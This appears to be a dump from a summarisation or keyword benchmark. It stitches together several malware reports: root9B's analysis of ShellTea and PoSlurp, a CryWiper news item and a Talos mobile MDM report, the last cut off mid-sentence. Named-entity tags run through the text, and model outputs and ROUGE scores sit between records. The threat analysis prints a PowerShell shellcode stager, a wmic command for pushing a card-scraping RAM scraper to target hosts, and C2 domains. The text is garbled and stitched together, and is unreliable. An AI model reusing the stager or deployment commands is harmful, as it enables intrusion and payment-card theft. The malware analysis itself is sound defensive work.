This mistake likely was not noticed by the developers since this array is not at the end of an allocation , meaning no crash occurs . The adversaries improved and re - implemented these techniques , although they reproduced the same bug , in the [ORG] ShellTea malware explored in - depth below . In previously reported samples , the malware would download a [ORG] DLL to disk as .db file and inject the code into memory . Our sample included not only the ability to write a [ORG] DLL to % % userprofile%%\\AppData\\LocalLow\\%u . db and run it via [ORG] rundll32 , but also to write an executable and run it , or to write a [ORG] DLL and load it directly into the calling process with LoadLibraryW , depending on the instructions provided by the C2 server . This malware performs HTTP requests with a user - agent created with the following format string : \u201c [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [ORG] 8.0 ; [ORG] Windows [ORG] NT [ORG] % u.%u%s)\u201dAdditionally , we observed functionality , if instructed by the server , to write a [ORG] DLL and add it to the \" HKLM\\ System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls \" registry key . This is an unusual persistence method that can also be used as an [ORG] AppLocker bypass . Each [ORG] DLL in [ORG] AppCertDlls will be loaded by the OS into a process whenever a new process is created.7Memory strings from the new [ORG] PowerSniff variantAnother difference in this variant , is that the strings checked to avoid targeting hospitals and schools have now been removed . This implies the actors behind this intrusion are either : [CARDINAL] 1 . ) willing to target healthcare and educational institutions ; or [CARDINAL] 2 . ) confident their targeted delivery mechanisms make these checks unnecessary . We also observed new [CARDINAL] C2 servers ( see the IOCs section for details.)The PowerSniff sample we analyzed , also inserted the string koollondon/ into the URL path used to contact its [CARDINAL] C2 servers . [GPE] Koollondon ( url is a radio station in [GPE] London , [GPE] England . After the initial PowerSniff intrusion , we observed the threat actors deploy [ORG] ShellTea , a newly identified piece of memory - resident malware for persistent access , and [PERSON] PoSlurp , a newly identified [LAW] PoS [LAW] malware.8SHELLTEA MEMORY RESIDENT MALWARE ( C2)Immediately following execution of [ORG] PowerSniff ( and a reboot ) , we discovered a set of suspicious registry values being launched in a registry key under HKCU\\Software , one of which is reproduced below . This registry value held a [ORG] PowerShell command that was loaded and invoked in memory by a separate [ORG] PowerShell launcher . We have reproduced the registry command below , sanitized and formatted slightly for clarity . It acts as a stager to load and execute a shellcode - style implant into memory . It does so by [ORDINAL] first loading up a binary registry value under the same key with Get - ItemProperty into variable $ s.$s=(Get - ItemProperty \t -Path \t HKCU : Software\\Random_Generated_RegistryName \u2013 Name \t Random_KeyName).Random_KeyName _ ; $ l=$s . Length;Next it uses Add - Type to enable the [ORG] PowerShell script to directly call the Win32 functions [PRODUCT] VirtualAlloc , [ORG] CreateThread , and WaitForSingleObject:$c=\"[DllImport(`\"user32.dll`\")]`npublic \t static \t extern \t Int32 IsChild(Int32 \t a , Int32 \t b);`n[DllImport(`\"kernel32.dll`\")]`npublic static \t extern \t Int32 GetCurrentProcessId();`n[DllImport(`\"kernel32.dll`\")]`npublic \t static extern \t [ORG] IntPtr \t CreateThread(IntPtr \t a , uint \t b , [ORG] IntPtr \t c , [ORG] IntPtr \t d , uint e , [PRODUCT] IntPtr \t f);`n[DllImport(`\"kernel32.dll`\")]`npublic \t static \t extern UInt32 \t WaitForSingleObject(IntPtr \t a , \t UInt32 b);`n[DllImport(`\"kernel32.dll`\")]`npublic \t static \t extern \t [ORG] IntPtr VirtualAlloc(IntPtr \t a , uint \t b , uint \t c , uint \t d ) ; \" ; $ a = Add - Type \t -memberDefinition \t $ c \t -Name \t ' Win32 ' \t -namespace Win32Functions \t -passthru;Internally , Add - Type dynamically creates a .cs file ( C # source code ) in the user \u2019s temp directory including the declarations from the [ORG] PowerShell string , runs csc.exe to compile that file into a [ORG] DLL , loads the [ORG] DLL from the temporary directory , then deletes the intermediate files . This automatically created [ORG] DLL is built from the source code in the $ c variable . It simply serves as a thin wrapper to allow [ORG] PowerShell , which can normally only directly call .NET class and object methods , to call the [CARDINAL] three given Win32 functions . It has no additional logic in it specific to this malware and is not used again after the script calls those [CARDINAL] three functions . We mention it since the dynamic creation and loading of DLLs from temporary directories is detectable with appropriate monitoring software . After enabling access to these functions by loading the new type , the script calls [PRODUCT] VirtualAlloc to allocate a section of memory that is readable , writable , and executable . It then copies the contents of the binary registry value into the new section of memory , creates a thread to start executing the loaded implant in memory , and finally waits [TIME] up [TIME] to [TIME] 5 [TIME] seconds for the thread to complete.9$b=$a::VirtualAlloc(0,$l,0x3000,0x40 ) ; [ System . Runtime . InteropServices . Marshal]::Copy($s,0,$b,$l ) ; $ b=$a::CreateThread(0,0,$b,0,0,0 ) ; $ b=$a::WaitForSingleObject($b,5000))The binary , which is never saved to a file , is the body of the memory - resident implant . It is composed of 64- bit code and data . At the start are [CARDINAL] two instructions to call [DATE] 1024 bytes into the shellcode blob , followed by configuration data . The shellcode then calculates its own address by reading it off the stack after it had been saved by the call instruction . This is a trick common to 32 - bit shellcode and seems to show the author was more familiar with writing 32 - bit shellcode . This trick is not necessary in [QUANTITY] 64 - bit as [CARDINAL] 64 - bit shellcode can directly read its own address or calculate an offset of it . The start of the [ORG] ShellTea shellcodeAfter obtaining its own address in memory , the shellcode processes a series of relocations . It calculates the difference between its current location in memory and its original base address ( 0x690000 in our sample ) . It then updates each of the relocations in memory , just like a normal executable loader . This process also performs some de - obfuscations on the binary . After this point , we can dump memory and begin to disassemble the code . The loader progresses to use a custom function resolver with a simple string hash algorithm that handles loading the required DLLs and resolving their imported functions . However , the binary has very few imported functions . Throughout the code , nearly every API call dynamically resolves a function , again re - using this custom resolver and a [QUANTITY] 4 - byte hash . We believe this is a previously unknown API hashing algorithm , as it did not match10other public API hashing algorithms3 or others we have encountered . We did not find any other public use of some of the constants used in this hashing algorithm , such as [CARDINAL] 0x463283F5 . The API hashing algorithm makes use of a standard linear congruential random number generator ( multiplier [PERSON] 0x19660 , increment 0x3C6EF35F.)ShellTea API hashing algorithmWe created a custom script to automatically map each of those function hashes to the corresponding API function before continuing analysis . [ORDINAL] First , we exported the disassembly of the entire implant and grepped for the function hash constants , saving those in [CARDINAL] one file . [ORDINAL] Second , we embedded the shellcode and function hashes into a small [LANGUAGE] C++ resolver program . This program called the hash - resolution function on each of the hashes , then used the Debug Help API to find out the names of the API functions that had been resolved . This same method can enable malware reverse engineers to resolve all hashed functions in a sample without stepping through each resolution in the original malware ( which is a time - consuming and manual process ) or recreating the function hashing algorithm . A link to this Function Hash Resolution tool can be found in the [ORG] Tools section.3url hashing analysis harnessThird , we pasted the output of the resolver program into a small [ORG] IDA Python script ( in [GPE] Tools ) to apply all the function resolutions to the analysis of the binary . [ORG] IDA script to apply function resolutions12The binary then adds a custom vectored exception handler to catch any crashes from within its own code and to continue execution safely if possible . The sample decrypts its own callback domains from its configuration block , which is also in the binary with the rest of the code . In our case , we list the [CARDINAL] six domains observed in the [ORG] IOC section . The implant also attempts to read and decrypt [CARDINAL] C2 information from a different registry key , if present , in addition to the built - in domains . The registry key is derived with CRC32 from various system - specific data sources . It then connects over port [CARDINAL] 443 using a custom binary protocol . It queries proxy configuration from the registry ( HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings ) and can communicate through proxies via the [ORG] CONNECT method as well . The implant \u2019s protocol uses the [ORG] XTEA encryption algorithm in CBC mode . The implant developers have a distinct preference for using low - level native API functions , presumably to avoid detection by standard analysis and HIPS tools . They also make extensive use of CRC32 by calling the undocumented RtlComputeCrc32 function . This function is uncommon , but was used most prominently by the [ORG] ZeroAccess rootkit4 and the [ORG] Andromeda malware5 , although neither in the same manner as is found in our sample . For example , the implant applies CRC32 to the computer and username and XORs with the [ORG] SID subauthority values taken directly from the [ORG] SID structure to assemble a mutex name . It uniquely identifies an implant and prevents duplicate infection against the same host under the same user account . This is likely done to differentiate hosts for tasking . [ORG] Excerpt from [ORG] ShellTea \u2019s mutex name derivation4url 5url implant injects its code into explorer.exe . [ORDINAL] First , it finds the process ID . [ORDINAL] Second , it uses the low - level RtlAdjustPrivilege call with the ID of the [PERSON] SE_DEBUG access right to enable the right to inject into nearly any process . [ORDINAL] Third , it opens the process , allocates memory in the process , copies its code into the allocated space , and uses the low level RtlCreateUserThread API to create a thread in the target process that will start executing its code . It then completes the process injection . It can find explorer by finding the process ID owning the shell 's desktop window by comparing process names or by using [PERSON] GetShellWindow . This is a function to return a handle to the [PRODUCT] Windows desktop which would be owned by explorer.exe . In addition to the API obfuscation , the implant uses extensive string obfuscation . It creates most strings on the stack directly before use , character by character , by adding and subtracting various values from a fixed start byte . Fortunately , a good decompiler will see through these . Below is a before - and - after comparison of the code that creates the format string used for the implant \u2019s mutex : [ORG] ShellTea mutex format string14The implant is built in a modular manner and implements several capabilities . The command dispatcher is shown below : [ORG] ShellTea command dispatcherIt has built - in routines to:\u2022 [PRODUCT] Drop an executable in a temporary directory , run it , and queue it for deletion at next reboot . It does so by using the Windows MoveFileEx API with the MOVEFILE_DELAY_UNTIL_REBOOT flag . Internally , this API writes to the [PERSON] PendingFileRenameOperations value of the registry key HKLM\\SYSTEM\\ CurrentControlSet\\Control\\Session Manager.\u2022 [PRODUCT] Drop a [ORG] DLL in a temporary directory and to load it , queuing it for deletion at next reboot via thesame mechanism.\u2022 Load an extension [ORG] DLL directly into memory . It includes a separate routine that will finish mapping theDLL into memory and link up its imports without touching disk.\u2022 Run an operator - provided [ORG] PowerShell command and receive results back.\u2022 [PERSON] Run raw shellcode directly in memory.\u2022 Install persistence by writing to the current user \u2019s Run key in the registry.15The implant implements sandbox and analysis detection with numerous techniques reminiscent of the analyzed [ORG] PowerSniff variant . It has improvements in algorithms used , number of analysis processes detected , and employs the just - in - time API function hash [PERSON] resolution:\u2022 [PERSON] Querying the SystemFirmwareTableInformation from the system and looking for common hypervisors.\u2022 [ORG] Obtaining the name of the system volume , hashing it , and comparing to a known hypervisor hash . Inthis case , in contrast with our [ORG] PowerSniff variant , [ORG] ShellTea uses SHA1 as a hashing algorithm.\u2022 Enumerating processes with a low - level API ( querying SystemProcessInformation ) , computing a CRC32 checksum of the upper - cased version of process names and comparing against a table of known monitoring or analysis processes . This includes the default process names of [ORG] Process [ORG] Monitor , [ORG] Wireshark , and [ORG] IDA . Again , this uses a new checksum algorithm . [ORG] ShellTea \u2019s process name CRC32 comparison16Once again , as in the PowerSniff variant , it appears the malware developers made the same mistake . There are now 27 CRC32s to check against in the array , but the loop comparing the process name CRC32 to the list of hashes runs [CARDINAL] 108 times . It reads off the end of the array and into other data . This is most likely because the malware developers wrote a loop that runs once for each byte in the checksum array instead of once for each checksum ( each checksum takes [CARDINAL] 4 bytes.)When the malware exits , it cleans itself up from memory using a clever technique . The exit function replaces its own return address with the address of RtlExitUserThread , then sets up the arguments for the [FAC] VirtualFree function to free its own code and jumps directly to [PERSON] VirtualFree . This function deallocates all the binary \u2019s memory . Then , when the Windows API function returns , rather than returning to the implant code ( which no longer exists in memory ) , it returns directly to the RtlExitUserThread function . This kills the thread and cleans up nearly all traces of the malware from the injected process . At this point , the adversaries have a foothold which they can use to explore the network environment further . root9B observed the use of common lateral movement techniques , such as dumping passwords , password hashes , and [ORG] Kerberos tickets with tools like mimikatz or similar . We also observed the adversaries stealing tokens , then using those credentials or creating forged [ORG] Kerberos tickets ( \u201c [WORK_OF_ART] Golden [WORK_OF_ART] Tickets \u201d ) to maneuver laterally and gain access to network servers on the PoS network which would become the staging points for the remainder of the attack . After obtaining the appropriate access to a server , they use that server to conduct basic network discovery to locate PoS endpoints and create target lists stored in flat text files . Then they have been observed to launch shell commands , including wmic.exe , to push the PoS software , which we dubbed PoSlurp , to the PoS machines to launch it . Upon successful collection and exfil of payment card data using [PRODUCT] PoSlurp , the adversaries then clean - up after themselves to eliminate on - disk artifacts . [PERSON] POSLURP [PERSON] MALWAREPoSlurp is a highly - obfuscated malicious [ORG] RAM scraper that gets remotely deployed to PoS systems and can be launched via local or remote commands . The file can be launched in any number of ways , but root9B observed it with both local and remote execution with command - line arguments matching the following pattern : Local Execution:[PoSlurp_filename].exe \t TARGET1.EXE#TARGET2.exe*1234*winlogon.exeRemote Execution : This command uses the file targets.txt as target list to direct the execution of PoSlurp to specific PoS end - points.17wmic /node:\"@targets.txt \" \t process \t call \t create \t \" cmd \t /c \t [ PoSlurp_filename].exe TARGET1.EXE#TARGET2.exe*1234*winlogon.exe\"The target executable names in the arguments refer to specific processes relating to PoS payment / routing software . The number in the middle is how many minutes ( 1234 ) to run the [ORG] RAM scraper , while the last filename in the command line ( winlogon.exe ) refers to the process to inject the inner [PRODUCT] PoSlurp malware into . As far as we can tell , [PERSON] PoSlurp should be able to inject itself into any user mode process . PoSlurp has an extensive amount of obfuscation to make analysis difficult , such as the use of opaque predicates ( functions with no return opcode just a jump or alternative instruction ) and multiple steps to load its main code . That said , we did not see sandbox and analysis detection in this sample . PoSlurp uses a [CARDINAL] three - step approach to load : Step [CARDINAL] 1 : The outer layer or Step [CARDINAL] 1 of the [PRODUCT] PoSlurp malware , like the [ORG] ShellTea backdoor , used a custom function resolver with a simple string hash algorithm that handles loading the required DLLs and resolving the imported functions . This function hashing algorithm , however , was unique and not the same as the [ORG] ShellTea sample . PoSlurp API hashing18PoSlurp \u2019s Step [CARDINAL] 1 [ORDINAL] first calculates [CARDINAL] one constant by resolving the address of [NORP] RtlWriteMemoryStream via function hash [CARDINAL] 0x22F3608C , then reads the [ORDINAL] second byte of that function , which is always [CARDINAL] 1 , to calculate its [ORDINAL] second function hash . Since its introduction into Windows , [GPE] RtlWriteMemoryStream has remained unimplemented as a function . It simply returns an error code . This means that the bytes of this function have not changed and can be treated as constants . The novel technique of using this code as a constant ensures that the malware will function reliably , yet fools some automated analysis tools that are not aware of the binary structure of all the external modules . Step [CARDINAL] 1 then uses the newly calculated hash , [CARDINAL] 0x1BC4C4FC , to resolve the low - level ZwAllocateVirtualMemory function which it calls to allocate executable and writable memory to extract its [ORDINAL] second step to . After decoding and copying the payload to the newly obtained memory , it starts executing the [ORDINAL] second step code . In our case , the [ORDINAL] second step was [CARDINAL] 6610 bytes long . Step [CARDINAL] 2 This code has its own resolution - by - hash function , a copy of the [PRODUCT] Carberp function hashing algorithm . Like [ORG] PowerSniff , [ORG] PoSlurp only incorporated the function hashing code from [PRODUCT] Carberp . [CARDINAL] One of the [ORDINAL] first functions to be resolved uses hash [CARDINAL] 0x594AA9E4 , the function hash of ZwAllocateVirtualMemory in that algorithm . The [ORG] Carberp - based Step [CARDINAL] 2 simply loads and links yet another embedded obfuscated binary as a [ORDINAL] third step , using low - level library loading and function resolution functions like LdrLoadDll and [PERSON] LdrGetProcedureAddress to resolve the [ORDINAL] third step \u2019s imported functions . Step [CARDINAL] 3 is an inner [ORG] DLL that uses minimal obfuscation tricks and contains most of the business logic . Step [CARDINAL] 3 is not completely unobfuscated , as it does use string obfuscation reminiscent of the [ORG] ShellTea memory - resident backdoor by assembling strings on the stack one character at a time . It parses the command line of the calling process , extracting out process names to inject into and monitor . It finds those processes using the standard high - level [ORG] CreateToolhelp32Snapshot and associated API calls , comparing executable names from the data returned . The inner [ORG] DLL uses similar process injection code to [ORG] ShellTea as well . [ORDINAL] First , it finds the process ID . [ORDINAL] Second , it uses the low - level RtlAdjustPrivilege call with the ID of the [PERSON] SE_DEBUG access right to enable the right to inject into nearly any process . [ORDINAL] Third , it opens the process , allocates memory in the process , copies its code into the allocated space , and uses the low level RtlCreateUserThread API to create a thread in the target process that will start executing its code . This completes the process injection . After that point , the original process exits . After being injected into the target process , [PERSON] PoSlurp re - links itself , deletes any old output file if present , and launches its [ORG] RAM scraping functionality . [TIME] Every [TIME] 5 [TIME] seconds until timeout , each data section of the target processes \u2019 memory is identified and scanned for strings indicative of payment card data which are then encrypted and saved.19PoSlurp memory scraping outer loopWhen scanning memory , it efficiently identifies memory sections of interest with VirtualQueryEx , then reads them into newly allocated sections of memory of the same size in its own process to search through their contents . PoSlurp code to search for data memory segments20Payment card data is detected by a series of simple tests which look for properly formatted data , such as strings of digits followed by an equals sign , with both [ORG] ASCII and wide - char strings . When payment card data is detected , the malware [ORDINAL] first calculates a hash of the string and checks against a running list of output hashes to ensure it does not output duplicate data , then writes its output to a hidden file in the % TMP% directory . It stores hashes for the last [CARDINAL] 10,000 strings it has output to use in its duplicate check . Assuming this is a new piece of payment card data and not a duplicate of [CARDINAL] one already detected , the data is encrypted with a simple XOR - based stream cipher using a randomly - selected [QUANTITY] 4 - byte key . This algorithm is based on a standard linear congruential random number generator with multiplier 0x19660D , but with a different increment value ( - 0x49F91E6B ) than the most common ( [CARDINAL] 0x3C6EF35F , which is also used in the [ORG] PowerSniff and [ORG] ShellTea malware.)PoSlurp encryption algorithmEach chunk of the output file starts with a [QUANTITY] 5 - byte header containing the length of the chunk in the [ORDINAL] first byte followed by the [QUANTITY] 4 - byte key and the encrypted data . Based on this static analysis , we created a decryption script for the data files shown below . # ! /usr / bin / ruby # \t [PERSON] Run \t like \t this \t in \t a \t console : \t ruby \t decrypt.rb \t < \t encrypted_data inp \t = \t [ORG] STDIN l \t = \t inp.read(1 ) until \t l.nil ? len \t = \t l.unpack('C')[0 ] key \t = \t inp.read(4).unpack('V')[0 ] crypted \t = \t inp.read(len).unpack('C * ' ) plain \t = \t crypted.map \t do \t [PERSON] |c| p \t = \t ( c \t ^ \t key ) \t & \t 0xFF key \t = \t ( ( 0x19660D \t * \t key ) \t & \t [CARDINAL] 0xFFFFFFFF ) \t - \t 0x49F91E6B puts \t plain.pack('C*').inspect l \t = \t inp.read(1 ) endThis script may aid future incident responders or law enforcement to identify what data has been stolen.21MITIGATION RECOMMENDATIONS\u2022 [ORG] Apply macro restrictions in your environment to prevent users from inadvertently running malicious [ORG] Office macros to help address this common initial access vector . For details , see : url [PRODUCT] microsoft.com/mmpc/2016/03/22/new-feature-in-office-2016-can-block-macros-and-help-prevent- [PRODUCT] infection/.\u2022 [PRODUCT] Limit the exposure of privileged administrator credentials by following best practices such as the [ORG] PAW model , audit your credential risks , and require multifactor authentication for privileged users . For details , see : url privileged - access - workstations.\u2022 Implement application whitelisting on PoS systems utilizing Microsoft \u2019s built - in [ORG] AppLocker or [CARDINAL] one of many commercial solutions . Much like the previous mitigation recommendation , PoS systems should be highly standardized and have no software running or installed that is n\u2019t part of required functionality . Audit application execution in a development environment to build an effective yet minimal whitelist.\u2022 [ORG] Develop and maintain a robust security monitoring program or contract an experienced security company . Tune your environment to collect relevant network and endpoint - based artifacts that allow you to detect adversary actions . Focus your analysis on critical network segments and employ active defense methodologies ( HUNT ) to proactively identify persistent [CARDINAL] threats.\u2022 Create a whitelist or greylist of domains and [ORG] IP addresses that your organization is allowed to reachvia the network.\u2022 Implement effective network segmentation controls . Prohibiting communication between distinct segments such as PoS and Store networks , except for required ports and protocols , and using different credentials in each network will greatly delay if not eliminate the attacker \u2019s ability to traverse the networks . Communication between systems in these critical networks should be far more predictable than the corporate network , enabling a security monitoring program to more easily identify abnormal activity.22INDICATORS OF COMPROMISE ( IOCS ) POWERSNIFF [CARDINAL] C2 DOMAINSvseflijkoindex.netvortexclothings.bizunkerdubsonics.orgpopskentown.comSHELLTEA C2 DOMAINSneofilgestunin.orgverfgainling.netstraubeoldscles.orgolohvikoend.orgmenoograskilllev.netasojinoviesder.orgTOOLSFunction Hash Resolution Tool , [ORG] IDA [ORG] Script , and Process Name CRC32 Code : url", "generated_text": "POSLURP; Retail Point-of-Sale; a targeted attack; the attackers; spearphishing emails; spearphishing emails; PowerShell; Dynamic Link Library; DLL; the malware; persistence; detection; the target environment; compromised privileged credentials; persistence; PoS processes; the memory; memory-resident code; a privileged user mode process; a privileged user mode process; data; the memory; an advanced memory-resident malware; PoSlurp; memory-resident code; a privileged user mode process; the malware; the POS process; the customer; the attacker; the attack; techniques; email; attack tactics; techniques; the threat; the malware.", "ref_text": "<START-1>The document describes a point-of-sale malware campaign targeting retailers. It begins with a phishing email containing macros that download an initial reconnaissance implant. This is followed by deployment of a persistent backdoor called ShellTea and a memory-scraping POS malware called PoSlurp. ShellTea injects into Explorer and uses obfuscation and anti-analysis techniques. PoSlurp directly injects into targeted POS processes to steal payment card data. The report analyzes the technical details of the malware and provides mitigation recommendations focused on restricting macros, limiting exposed credentials, whitelisting, monitoring, and network segmentation. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5221238938053097, "gpt3/lexical/rouge_rouge2": 0.08928571428571429, "gpt3/lexical/rouge_rougeL": 0.26548672566371684, "gpt3/lexical/rouge_rougeLsum": 0.26548672566371684, "gpt3_generated_text": ["This article discusses a targeted attack on retail point-of-sale (PoS) systems using memory-resident malware. The attackers use spearphishing emails to target individuals within organizations, sending malicious attachments with macro-enabled Office documents. When the recipient opens the document and enables macros, a PowerShell command is executed, downloading a payload into memory. The malware then conducts reconnaissance and sandbox detection, and if the target meets the attacker's conditions, additional instructions are sent. The attackers install a second fileless implant called ShellTea, which has not been previously reported. The attacker explores the network using compromised privileged credentials and deploys a PoS RAM scraping malware called PoSlurp, which directly injects memory-resident code into a privileged user mode process. The article provides a detailed analysis of the attack methodology and suggests mitigation recommendations."]}, {"split_name": "val", "sample_id": "val_32", "prompt_text": "Extract the keywords: www.bleepingcomputer.com /news / security / new - crywiper - data - wiper - targets - russian - courts - mayor - s - offices/ New CryWiper data wiper targets [NORP] Russian courts , mayor \u2019s offices [PERSON] Bill [PERSON] Toulas \u22ee \u22ee [CARDINAL] 12/2/2022A previously undocumented data wiper named [ORG] CryWiper is masquerading as ransomware , but in reality , destroys data beyond recovery in attacks against [NORP] Russian mayor 's offices and courts . [ORG] CryWiper was [ORDINAL] first discovered by [ORG] Kaspersky [DATE] this [DATE] fall , where they say the malware was used in an attack against a [NORP] Russian organization . \"In [DATE] the [DATE] fall [DATE] of [DATE] 2022 , our solutions detected attempts by a previously unknown [GPE] Trojan , which we named [ORG] CryWiper , to attack an organization 's network in [GPE] the [GPE] Russian [GPE] Federation , \" explains the new report by [PERSON] Kaspersky . However , a report by by [NORP] Russian media says that the malware was used in attacks against [NORP] Russian mayor 's offices and courts . As the code analysis reveals , the data - wiping function of [ORG] CryWiper is n't a mistake but a purposeful tactic to destroy targets ' data . Wiping the victim 's [PRODUCT] dataCryWiper is a [CARDINAL] 64 - bit [PRODUCT] Windows executable named ' browserupdate.exe ' written in [LANGUAGE] C++ , configured to abuse many WinAPI function calls . Upon execution , it creates scheduled tasks to run [TIME] every [TIME] five [TIME] minutes on the compromised machine . Creation of scheduled task ( Kaspersky)Next , it contacts a command and control server ( C2 ) with the name of the victim 's machine . The [CARDINAL] C2 responds with either a \" run \" or \" do not run \" command , determining whether the wiper will activate or stay dormant . [PERSON] Kaspersky reports seeing execution delays of [DATE] 4 [DATE] days ( [TIME] 345,600 [TIME] seconds ) in some cases , likely added in the code to help confuse the victim as to what caused the infection . [ORG] CryWiper will stop critical processes related to MySQL , MS [ORG] SQL database servers , [ORG] MS [ORG] Exchange email servers , and [ORG] MS [ORG] Active [ORG] Directory web services to free locked data for destruction.1/2Services killed by [ORG] CryWiper ( Kaspersky)Next , the malware deletes shadow copies on the compromised machine to prevent the easy restoration of the wiped files . [ORG] CryWiper also modifies [LAW] the [LAW] Windows [LAW] Registry to prevent RDP connections , likely to hinder intervention and incident response from remote IT specialists . Finally , the wiper will corrupt all enumerated files except for \" .exe \" , \" .dll \" , \" lnk \" , \" .sys \" , \" .msi \" , and its own \" .CRY \" , while also skipping System , [WORK_OF_ART] Windows , [WORK_OF_ART] and [WORK_OF_ART] Boot directories to prevent rendering the computer completely unusable . The algorithm for corrupting the files is based on \" [PERSON] Mersenne [PERSON] Twister , \" a pseudorandom number generator . This is the same algorithm used by [ORG] IsaacWiper , but the researchers established no further connection between the [CARDINAL] two families . After this step , [ORG] CryWiper will generate ransom notes named ' README.txt , ' asking for [CARDINAL] 0.5 Bitcoin ( [MONEY] approximately $ 8,000 ) in exchange for a decrypter . Unfortunately , this is a false promise , as the corrupted data can not be restored . [ORG] Ransom note generated by [ORG] CryWiper ( Kaspersky)Even though [ORG] CryWiper is not ransomware in the typical sense , it can still cause severe data destruction and business interruption . [PERSON] Kaspersky says [ORG] CryWiper does not seem to be associated with any wiper families emerging in [DATE] 2022 , like [ORG] DoubleZero , [ORG] IsaacWiper , [ORG] HermeticWiper , [ORG] CaddyWiper , [ORG] WhisperGate , [ORG] AcidRain , and Industroyer2.Update [CARDINAL] 11/2/2 : Added further information about [ORG] CryWiper targets ( h / t Risky Biz).2/2", "generated_text": "a ransom note; ransomware; CryWiper; ransomware; attacks; Russian; offices; courts; stealth; documents; the victim; a 64-bit Windows executable; browserupdate.exe; scheduled tasks; every five minutes; the compromised machine; the C2; the name; the victim's machine; the C2; the name; the victim's machine; the C2; the wiper; Shadow copies; system; Windows Registry; RDP connections; RDP connections; a false promise; the corrupted data; business interruption; Kaspersky; a vendor; the antivirus software; ransomware; the malware; the attackers; a new report; a threat intelligence operation; processes; the first generation; the CryWiper family; IOCs.", "ref_text": "<START-1>The document describes a new data wiper malware called CryWiper that has been used in attacks against Russian organizations, including mayor's offices and courts. CryWiper was first discovered by Kaspersky in fall 2022 being used against a Russian entity. CryWiper masquerades as ransomware but is actually designed to permanently destroy data beyond recovery. It creates scheduled tasks to repeatedly run on compromised systems. It contacts a command and control server which can remotely activate the wiping process. CryWiper stops critical database and email services, deletes shadow copies, and modifies the registry to prevent remote access. It then corrupts files on the system while skipping certain directories and file types to avoid fully disabling the computer. After wiping files, it generates a fake ransom note demanding payment in Bitcoin to decrypt files, even though restoration is not possible. The wiping uses an algorithm called Mersenne Twister, distinct from other 2022 wipers like IsaacWiper. While not true ransomware, CryWiper can still cause severe data destruction and business disruption. It does not appear related to major 2022 wipers like WhisperGate and AcidRain that targeted Ukraine. CryWiper has been deployed against Russian entities, marking a change from wipers focused on Ukraine. In summary, CryWiper is a destructive new data wiper used in attacks on Russian mayor's offices and courts, masquerading as ransomware while making reliable data recovery impossible. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5839793281653747, "gpt3/lexical/rouge_rouge2": 0.2805194805194805, "gpt3/lexical/rouge_rougeL": 0.40826873385012924, "gpt3/lexical/rouge_rougeLsum": 0.40826873385012924, "gpt3_generated_text": ["A new data wiper called CryWiper has been discovered targeting Russian mayor's offices and courts. Initially masquerading as ransomware, CryWiper actually destroys data beyond recovery. The malware, first discovered by Kaspersky, is a 64-bit Windows executable named 'browserupdate.exe' and creates scheduled tasks to run every five minutes on the compromised machine. It contacts a command and control server to receive commands on whether to activate or stay dormant. CryWiper stops critical processes related to database servers, email servers, and web services before deleting shadow copies on the compromised machine. It also modifies the Windows Registry to prevent RDP connections and corrupts most files on the system. CryWiper then generates a ransom note asking for 0.5 Bitcoin in exchange for a decrypter, although the data cannot be restored. While not classified as traditional ransomware, CryWiper can still cause severe data destruction and business interruption. Kaspersky states that CryWiper is not associated with any known wiper families from 2022."]}, {"split_name": "val", "sample_id": "val_33", "prompt_text": "Extract the keywords: SoftwareVulnerability InformationReputationCenterLibrarySupportCommunitiesAboutCareersBlogT H U R S D AY , J U LY 1 2 , 2 0 1 8Advanced Mobile Malware Campaign in [GPE] India uses Malicious MDMThis blog post is authored by [PERSON] Warren [PERSON] Mercer and [PERSON] Paul [PERSON] Rascagneres and [PERSON] Andrew [PERSON] Williams . S U M M AR [PERSON] YCisco [PERSON] Talos has identified a highly targeted campaign against [CARDINAL] 13 [ORG] iPhones which appears to be focused on [GPE] India . The attacker deployed an open - source mobile device management ( [ORG] MDM ) system to control enrolled devices . At this time , we do n't know how the attacker managed to enroll the targeted devices . Enrollment could be done through physical access to the devices , or most likely by using social engineering to entice a user to register . In social engineering attacks the victim is tricked into clicking accept or giving the attacker physical access to a device . This campaign is of note since the malware goes to great lengths to replace specific mobile apps for data interception . [ORG] Talos has worked closely with [ORG] Apple on countering this threat . [ORG] Apple had already actioned [CARDINAL] 3 certificates associated with this actor when [PERSON] Talos reached out , and quickly moved to action the [CARDINAL] two others once [ORG] Talos tied them to the threat . An [ORG] MDM is designed to deploy applications on enrolled devices . In this campaign we identified [CARDINAL] five applications that have been distributed by this system to the [CARDINAL] 13 targeted devices in [GPE] India . [CARDINAL] Two of them appear to test the functionality of the device , [CARDINAL] one steals SMS message contents , and the remaining [CARDINAL] two report the location of the device and can exfiltrate various data . [ORG] Convert webpages to pdf online with PDFmyURLSearch BlogS UB S C R IB E T O OUR FE E DPostsCommentsSubscribe via EmailB L OG A R C HIV E \u25bc [CARDINAL] 2 0 1 8 ( [CARDINAL] 102 ) \u25bc [PERSON] J [PERSON] U [PERSON] LY ( 9)Beers with [ORG] Talos [ORG] EP33 [ORG] - [ORG] Change [ORG] theConversation or [ORG] Threat [ORG] Roundup for [DATE] July 6 [DATE] - [DATE] 13 Advanced Mobile MalwareCampaign in [GPE] India uses [ORG] Mal [ORG] Vulnerability [ORG] Spotlight : Computerinsel Photoline M Vulnerability Spotlight : [ORG] MultipleAntenna [ORG] House Vu [PERSON] Microsoft [PERSON] Patch [DATE] Tuesday [DATE] - [DATE] July [DATE] 2018 Vulnerability Spotlight : [ORG] MultipleThe attacker used the [ORG] BOptions sideloading technique to add features to legitimate apps , including the messaging apps [ORG] WhatsApp and [ORG] Telegram , that were then deployed by the [ORG] MDM onto the [CARDINAL] 13 targeted devices in [GPE] India . The purpose of the [ORG] BOptions sideloading technique is to inject a dynamic library in the application . The malicious code inserted into these apps is capable of collecting and exfiltrating information from the device , such as the phone number , serial number , location , contacts , user 's photos , [ORG] SMS and [ORG] Telegram and [ORG] WhatsApp chat messages . Such information can be used to manipulate a victim or even use it for blackmail or bribery . Thanks to the logs located on the [ORG] MDM servers and the malware 's command and control ( C2 ) server , we were able to determine that the malware has been in use since [DATE] August [DATE] 2015 . The campaign targeted only a few select devices ( [CARDINAL] 13 ) that are all located in [GPE] India . The attacker left essential data on the servers , such as emails and usernames . As part of the attacker 's development and testing it appears that they 